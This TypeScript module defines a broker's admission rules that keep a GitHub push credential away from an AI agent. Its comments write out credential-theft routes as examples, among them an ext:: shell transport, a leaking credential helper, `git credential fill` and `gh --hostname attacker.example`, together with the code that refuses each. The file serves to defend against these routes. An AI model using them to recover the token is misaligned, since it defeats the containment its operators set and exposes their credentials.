// PEN-4933 / PEN-3183 D1: what the broker will and will not do on the agent's
// behalf.
//
// The broker holds the GitHub push credential in a container the agent cannot
// read (PEN-3183 §5). That removes the agent's ability to authenticate
// DIRECTLY, and replaces it with the ability to ask this process to
// authenticate FOR it. Every rule in this file exists because that replacement
// is only as narrow as what the broker agrees to run: an agent that can make
// the broker execute code of its choosing, or print the broker's own
// environment, has recovered the credential and the boundary is gone.
//
// ⛔ These rules are ADMISSION rules — "may the broker run this at all". They
// are NOT a second opinion about what a push may CONTAIN. That question has
// exactly one answer in this codebase (`scrubGitHubEgressText`, reached through
// the existing shims) and PEN-3183 §8 prohibits the broker from re-deriving it,
// because door parity is a tested invariant. Nothing here inspects commit
// content, issue bodies or request payloads, and nothing here should start to.
//
// Everything in this module is pure so the refusals can be exercised without a
// socket, a repository, or a credential.

import path from "node:path";

import { classifyGitInvocation, type GitEgressEnv } from "./github-git-egress-shim.js";
import type { BrokeredTool } from "./github-publish-broker-protocol.js";

export class PublishBrokerRefusal extends Error {
  constructor(message: string) {
    super(message.startsWith("paperclip-github-broker") ? message : `paperclip-github-broker: ${message}`);
    this.name = "PublishBrokerRefusal";
  }
}

/**
 * The two `credential.*` assignments the shipped `git` wrapper adds.
 *
 * The agent-side wrapper passes these before the caller's own argv, so they
 * arrive here on every forwarded push. They are STRIPPED and re-added by the
 * broker rather than trusted, because a caller can spell them too and the
 * broker must not care which of the two sent them.
 *
 * Kept byte-identical to `docker/github-wrappers/git`; asserted by
 * `github-publish-broker-policy.test.ts`, which reads that file. Editing one
 * without the other reds that test by design — the flags are a pinned exact
 * set (PEN-4541) and this is the second place they now appear.
 */
export const WRAPPER_CREDENTIAL_CONFIG_ASSIGNMENTS: readonly string[] = [
  "credential.https://github.com.helper=",
  "credential.https://github.com.helper=/usr/local/libexec/paperclip/bin/github-token-credential-helper",
];

/**
 * Global options that take a SEPARATE following token, for the narrow purpose
 * of finding config assignments. Deliberately a local copy of the subset this
 * file cares about rather than an import: the shim's list is tuned to finding
 * the SUBCOMMAND boundary, and if it ever grows an entry this scan would
 * silently start skipping a token it should have read.
 */
const CONFIG_OPTION_TOKENS = new Set(["-c", "--config-env"]);

export interface GitConfigAssignment {
  /** As spelled by the caller, for the refusal message. */
  spelling: string;
  /** `key=value`, normalised across the three accepted spellings. */
  assignment: string;
}

/**
 * Every `-c` / `--config-env` assignment among an invocation's GLOBAL options.
 *
 * Three spellings, all of them real: `-c k=v`, `--config-env k=v` and
 * `--config-env=k=v`. git rejects the sticky `-ck=v` outright (measured on
 * 2.47.3), so there is no attached short form to miss. `--config-env` takes the
 * VALUE from a named environment variable — the broker builds its child's
 * environment itself, so such a variable resolves to nothing, but the KEY is
 * still attacker-chosen and is what this scan is reading.
 */
export function gitConfigAssignments(argv: readonly string[]): GitConfigAssignment[] {
  const found: GitConfigAssignment[] = [];
  let index = 0;
  while (index < argv.length) {
    const token = argv[index]!;
    if (!token.startsWith("-")) break;
    if (CONFIG_OPTION_TOKENS.has(token)) {
      const value = argv[index + 1];
      if (value !== undefined) found.push({ spelling: `${token} ${value}`, assignment: value });
      index += 2;
      continue;
    }
    if (token.startsWith("--config-env=")) {
      found.push({ spelling: token, assignment: token.slice("--config-env=".length) });
    }
    index += 1;
  }
  return found;
}

/**
 * Config assignments the broker injects on every push it performs.
 *
 * `protocol.allow=never` plus an explicit `https` allowance is the load-bearing
 * one, and it is git's own mechanism rather than a parser of ours. Without it
 * `git push ext::sh -c '…'` asks git to run a LOCAL command as the transport —
 * which, in this process, means running attacker-chosen code in the one
 * container that holds the credential. `file://` and `ssh://` are refused for
 * the same reason and because neither is a route to github.com.
 *
 * Deliberately NOT a check on the destination URL. Re-deriving which remote a
 * push resolves to means reimplementing `push.default`, refspec and tracking
 * rules, and disagreeing with git in the permissive direction is a silent hole
 * — the same reasoning that put the content scan in a pre-push hook rather than
 * in the wrapper (`github-git-egress-runtime.ts`). Pinning the TRANSPORT needs
 * none of that and cannot disagree with git, because it is git enforcing it.
 *
 * The credential helper pins the destination on the other axis:
 * `github-token-credential-helper` answers only for an exact
 * `protocol=https` + `host=github.com` pair, so a push aimed anywhere else
 * completes the transport and then fails to authenticate, rather than handing
 * the token to the host the caller named.
 *
 * The remaining four pin config keys that can make git EXECUTE something, and
 * they are a named set rather than a claim of completeness. The repository the
 * broker is asked to publish belongs to uid 1000, so its `.git/config` is
 * attacker-chosen input read by the one process that holds the credential —
 * which is precisely the hazard git's own `safe.directory` check exists to warn
 * about, and which the broker has to suppress (below) in order to work at all.
 * `core.askpass` and `core.fsmonitor` are run by git directly; `http.proxy`
 * together with `http.sslVerify=false` would route the authenticated request
 * through a host of the caller's choosing. ⚠ This list closes the vectors that
 * have been enumerated. It is NOT a proof that no other config key can reach an
 * exec during a push, and it must not be described as one — see the residual
 * recorded in `docs/security/PEN-3183-git-egress-enforcement-boundary-decision.md`
 * §7.3.
 */
export const BROKER_INJECTED_GIT_CONFIG: readonly string[] = [
  "protocol.allow=never",
  "protocol.https.allow=always",
  "core.askpass=",
  "core.fsmonitor=false",
  "http.proxy=",
  "http.sslVerify=true",
  ...WRAPPER_CREDENTIAL_CONFIG_ASSIGNMENTS,
];

/**
 * Config the broker injects that depends on the resolved working directory.
 *
 * `safe.directory` is required, not optional: the broker runs as a different
 * uid from the one that owns the repository, and git refuses to operate on a
 * repository of "dubious ownership" without it. It is scoped to the ONE
 * directory this request resolved to, never `*` — a wildcard would also admit
 * any other repository the broker's mounts can reach, including ones belonging
 * to other agents on the same shared volume.
 */
export function brokerGitConfigForCwd(cwd: string): string[] {
  return [`safe.directory=${cwd}`];
}

export interface AdmittedGitPush {
  /** argv with caller config assignments removed and the broker's own prepended. */
  argv: string[];
}

/**
 * Admit a `git` request, or refuse it.
 *
 * Two questions, in this order:
 *
 *  1. **Is it a push?** Only publishing needs a credential; everything else git
 *     does is local and runs in the agent container at uid 1000, where it
 *     belongs. Narrowing the broker to pushes is what closes `git credential
 *     fill` — which would otherwise ask the broker's own helper for the token
 *     and print it to the agent's stdout. That is not a hypothetical: it is the
 *     shortest path from "the broker runs git for me" back to "I have the
 *     token", and it is closed by the verb, not by a denylist.
 *
 *  2. **Does it carry config of its own?** `credential.helper` is multi-valued,
 *     and git hands every configured helper the credential it just used through
 *     `credential approve`. A caller-supplied
 *     `-c credential.https://github.com.helper='!cat >/tmp/leak'` therefore
 *     receives the token after a successful push. Appending the broker's
 *     clearing assignment cannot fix it — the caller's can be appended too, and
 *     "whoever wrote the last one wins" is not a boundary. So: no caller config
 *     at all, except the two the shipped wrapper itself adds, which are dropped
 *     and re-added from {@link BROKER_INJECTED_GIT_CONFIG}.
 *
 * `classifyGitInvocation` is called WITHOUT an alias resolver on purpose. The
 * broker re-classifies to decide admission, and an alias lookup would read
 * config out of the caller's repository — attacker-chosen input, consulted to
 * decide whether attacker-chosen input is admissible. The agent-side runtime
 * still resolves aliases with the full resolver before forwarding, and the
 * broker-side runtime resolves them again when it builds the real argv; this
 * call is only asking "is the literal verb here a push", and a bare alias that
 * resolves to one is refused rather than admitted, which is the safe direction.
 */
export function admitGitPush(argv: readonly string[], env: GitEgressEnv = {}): AdmittedGitPush {
  const classification = classifyGitInvocation(argv, undefined, env);
  if (!classification.isPush) {
    throw new PublishBrokerRefusal(
      `the broker performs pushes, and this is \`git ${classification.subcommand ?? "(no subcommand)"}\`. ` +
        "Everything git does that is not a publish runs locally in your own container — call it there. " +
        "If this really is a push reached through an alias, spell it as `git push`: the broker will not " +
        "resolve an alias out of the repository it is being asked to publish.",
    );
  }

  const assignments = gitConfigAssignments(argv);
  const disallowed = assignments.filter(
    (a) => !WRAPPER_CREDENTIAL_CONFIG_ASSIGNMENTS.includes(a.assignment),
  );
  if (disallowed.length > 0) {
    throw new PublishBrokerRefusal(
      `refusing a push that sets git config itself (${disallowed.map((a) => `\`${a.spelling}\``).join(", ")}). ` +
        "`credential.helper` is multi-valued and git hands every configured helper the credential it just " +
        "used, so a caller-supplied one would receive the push token. The broker supplies its own config and " +
        "accepts none. Set repository-local config in your own container instead.",
    );
  }

  // Strip, then prepend. Stripping first means a caller echoing the wrapper's
  // own flags gains nothing: whatever they sent is discarded, and the set git
  // actually sees is this process's.
  const stripped = stripGitConfigAssignments(argv);
  const injected = BROKER_INJECTED_GIT_CONFIG.flatMap((assignment) => ["-c", assignment]);
  return { argv: [...injected, ...stripped] };
}

/** Remove every `-c` / `--config-env` assignment from an invocation's globals. */
export function stripGitConfigAssignments(argv: readonly string[]): string[] {
  const out: string[] = [];
  let index = 0;
  while (index < argv.length) {
    const token = argv[index]!;
    if (!token.startsWith("-")) break;
    if (CONFIG_OPTION_TOKENS.has(token)) {
      index += 2;
      continue;
    }
    if (token.startsWith("--config-env=")) {
      index += 1;
      continue;
    }
    out.push(token);
    index += 1;
  }
  return [...out, ...argv.slice(index)];
}

/**
 * `gh` subcommands the broker refuses outright.
 *
 * Each is a way to get the credential, or code that can read it, out of the
 * broker — not a judgement about whether the operation is useful:
 *
 *  - `auth` — `gh auth token` prints the token on stdout, and
 *    `gh auth git-credential` prints it as a credential record. `gh auth
 *    status --show-token` does the same with a decoration. There is no
 *    sub-subcommand of `auth` the agent needs from a broker whose entire
 *    purpose is that the agent never holds a token, so the whole verb goes.
 *  - `alias` — a `gh` alias may be a SHELL alias (`gh alias set x '!…'`), which
 *    `gh` then executes with its own environment. That is arbitrary code
 *    running beside the credential. The broker also runs `gh` against a fresh,
 *    empty `GH_CONFIG_DIR` on every invocation, so an alias could not persist
 *    even if one could be written; this refusal is the legible half of that
 *    pair, and neither is load-bearing alone.
 *  - `extension` — same shape as `alias`, with a download step in front of it.
 *
 * This is a denylist, which is the weaker form, and it is used here because the
 * alternative — an allowlist of `gh` verbs — would have to be revised every
 * time the CLI grows one, and a *missing* allowlist entry breaks an agent's
 * work rather than failing closed. The ephemeral config dir is what makes the
 * weaker form acceptable: the two code-execution verbs above are refused AND
 * have nothing to execute from.
 */
export const REFUSED_GH_SUBCOMMANDS: readonly string[] = ["auth", "alias", "extension", "extensions"];

/**
 * Admit a `gh` request, or refuse it.
 *
 * `--hostname` is refused anywhere in argv, not only in the leading position.
 * `gh` sends `Authorization: token <GH_TOKEN>` to whatever host it was pointed
 * at, so `gh api --hostname attacker.example …` is a one-flag exfiltration of
 * the credential this boundary exists to hold. `GH_HOST` is the same hazard by
 * another route and is closed by the broker building its own environment.
 */
export function admitGhInvocation(argv: readonly string[]): void {
  const verb = argv.find((token) => !token.startsWith("-"));
  if (verb !== undefined && REFUSED_GH_SUBCOMMANDS.includes(verb.toLowerCase())) {
    throw new PublishBrokerRefusal(
      `refusing \`gh ${verb}\`: it is a route from "the broker runs gh for me" back to holding the token ` +
        "itself (`auth` prints it; `alias` and `extension` run shell beside it). The broker holds the " +
        "credential so that nothing at uid 1000 does — see docs/security/" +
        "PEN-3183-git-egress-enforcement-boundary-decision.md §5.",
    );
  }
  for (const token of argv) {
    if (token === "--hostname" || token.startsWith("--hostname=")) {
      throw new PublishBrokerRefusal(
        "refusing a `gh` invocation that names its own hostname: gh sends the Authorization header to " +
          "whichever host it is pointed at, so this would send the push credential somewhere other than " +
          "github.com.",
      );
    }
  }
}

/**
 * Admit a `github-mcp-server` request, or refuse it.
 *
 * The same hostname reasoning as `gh`: the MCP server authenticates with
 * `GITHUB_PERSONAL_ACCESS_TOKEN` against `--gh-host` / `GITHUB_HOST`.
 */
export function admitMcpInvocation(argv: readonly string[]): void {
  for (const token of argv) {
    if (token === "--gh-host" || token.startsWith("--gh-host=") || token === "--host" || token.startsWith("--host=")) {
      throw new PublishBrokerRefusal(
        "refusing a `github-mcp-server` invocation that names its own host: the server authenticates to " +
          "whichever host it is given, so this would send the push credential somewhere other than github.com.",
      );
    }
  }
}

export function admitInvocation(tool: BrokeredTool, argv: readonly string[], env: GitEgressEnv = {}): string[] {
  switch (tool) {
    case "git":
      return admitGitPush(argv, env).argv;
    case "gh":
      admitGhInvocation(argv);
      return [...argv];
    case "github-mcp-server":
      admitMcpInvocation(argv);
      return [...argv];
  }
}

/**
 * Resolve the working directory a request asked for, or refuse it.
 *
 * The broker shares the agent's workspace volume — it has to, because it runs
 * git against the agent's repository. Confining `cwd` to that volume stops a
 * request naming a directory inside the broker's OWN filesystem, so that a
 * tool resolving a RELATIVE path cannot be aimed at one.
 *
 * ⚠ That is all it does. It is not what stops a tool reading a broker-local
 * file, because `gh` takes ABSOLUTE paths for its file-backed inputs
 * (`--body-file`, `gh api --input`, `-F field=@file`) and an absolute path
 * does not care what the working directory is. {@link admitCallerFilePaths} is
 * the rule that covers those; this one covers the directory they would
 * otherwise be resolved against. Both are needed and neither subsumes the
 * other.
 *
 * Compared after resolution, so `..` cannot walk out, and with a trailing
 * separator so `/paperclip-evil` does not pass a `/paperclip` prefix test.
 * Symlink resolution is the CALLER's job (the broker passes `realpathSync`),
 * because a path that resolves out of the volume through a link the agent
 * planted is exactly the case this must catch.
 */
export function resolveBrokerCwd(
  cwd: string,
  workspaceRoot: string,
  realpath: (p: string) => string,
): string {
  if (!path.isAbsolute(cwd)) {
    throw new PublishBrokerRefusal(`refusing a relative working directory \`${cwd}\``);
  }
  let resolved: string;
  try {
    resolved = realpath(cwd);
  } catch {
    throw new PublishBrokerRefusal(`refusing a working directory that does not resolve: \`${cwd}\``);
  }
  const root = realpath(workspaceRoot);
  if (!isUnderRoot(resolved, root)) {
    throw new PublishBrokerRefusal(
      `refusing a working directory outside the shared workspace: \`${cwd}\` resolves to \`${resolved}\`, ` +
        `which is not under \`${root}\`.`,
    );
  }
  return resolved;
}

/** Is `candidate` the directory `root`, or something under it? */
function isUnderRoot(candidate: string, root: string): boolean {
  return candidate === root || candidate.startsWith(root.endsWith(path.sep) ? root : `${root}${path.sep}`);
}

/**
 * Every spelling of a filesystem path a single argv token could be.
 *
 * Three forms, because `gh` accepts all three and the token is one string:
 *
 *  - `--body-file /tmp/b.md` — the path IS the token.
 *  - `--body-file=/tmp/b.md` — the path follows an `=`.
 *  - `-F body=@/tmp/b.md`    — the path follows an `@`, and `gh api` reads it.
 *
 * Returned as CANDIDATES rather than as "the path argument", because this
 * module deliberately does not model which `gh` flags take files. A denylist
 * of file-bearing flags would have to grow every time the CLI does, and a
 * missing entry would fail OPEN — the shape {@link REFUSED_GH_SUBCOMMANDS}
 * can accept because the config dir backs it up, and this one cannot, because
 * there is nothing behind it. Treating every token as a possible path costs a
 * `realpath` per token and cannot miss a flag that has not been invented yet.
 */
export function filePathCandidates(token: string): string[] {
  const out = [token];
  const eq = token.indexOf("=");
  if (eq > 0) out.push(token.slice(eq + 1));
  for (const form of [...out]) {
    const at = form.indexOf("@");
    // `@-` is gh's spelling for stdin, not a path.
    if (at >= 0 && form.slice(at + 1) !== "-") out.push(form.slice(at + 1));
  }
  return out.filter((c) => c.length > 0 && c !== "-");
}

export interface FilePathConfinement {
  /** Directories a request's file arguments may resolve into. */
  allowedRoots: readonly string[];
  /** Resolved working directory, for relative candidates. */
  cwd: string;
  realpath: (p: string) => string;
}

/**
 * Refuse a request whose arguments name a file the AGENT cannot open but the
 * BROKER can.
 *
 * The broker's filesystem is not the agent's: it holds the credential mount,
 * and it is the only container that does. `gh` reads file-backed inputs by
 * path — `--body-file`, `gh api --input`, `-F field=@file`, `gh ssh-key add
 * <file>` — and none of those care about the working directory when given an
 * absolute path. Without this rule the only thing standing between
 * `gh issue comment --body-file /etc/paperclip/secrets/github-token/token` and
 * a published credential is the content scrubber, and §8 of the decision
 * document is explicit that the scrubber is a mistake guard, not a boundary.
 *
 * The rule is positional, not lexical: a candidate is refused when it RESOLVES
 * to something that EXISTS outside every allowed root.
 *
 *  - Existing and outside → refused. That is the whole hazard class, and it
 *    catches a symlink planted in the shared `/tmp` because the comparison is
 *    made after `realpath`.
 *  - Non-existent → admitted. There is nothing to read, and this is what keeps
 *    `gh api /repos/o/r/pulls` working: an API path is absolute and is not a
 *    file. Refusing on the nearest existing ANCESTOR instead would refuse
 *    exactly that call, since its ancestor is `/`.
 *  - Existing and inside → admitted. This is the `--body-file /tmp/x.md`
 *    channel the shared `/tmp` exists for.
 *
 * Applied to the CALLER's argv, before the broker prepends its own config —
 * the broker's `credential.helper` assignment names a real path in the image,
 * outside every allowed root, and it is not caller input.
 *
 * ⚠ This is a read confinement. A write to a path outside the roots is not
 * refused here; it is refused by the broker running non-root against an image
 * it does not own. Recorded in §7.3 rather than claimed as closed.
 */
export function admitCallerFilePaths(argv: readonly string[], confinement: FilePathConfinement): void {
  const roots = confinement.allowedRoots.map((root) => {
    try {
      return confinement.realpath(root);
    } catch {
      return root;
    }
  });
  for (const token of argv) {
    for (const candidate of filePathCandidates(token)) {
      const absolute = path.isAbsolute(candidate) ? candidate : path.resolve(confinement.cwd, candidate);
      let resolved: string;
      try {
        resolved = confinement.realpath(absolute);
      } catch {
        continue; // Names nothing on disk; there is no file here to read.
      }
      if (roots.some((root) => isUnderRoot(resolved, root))) continue;
      throw new PublishBrokerRefusal(
        `refusing an argument that names a file outside the shared workspace: \`${token}\` resolves to ` +
          `\`${resolved}\`. The broker's filesystem holds the push credential, so a tool it runs may only ` +
          `read files the agent could have read too — under ${roots.map((r) => `\`${r}\``).join(" or ")}. ` +
          "Copy what you need into the shared /tmp and name it there.",
      );
    }
  }
}
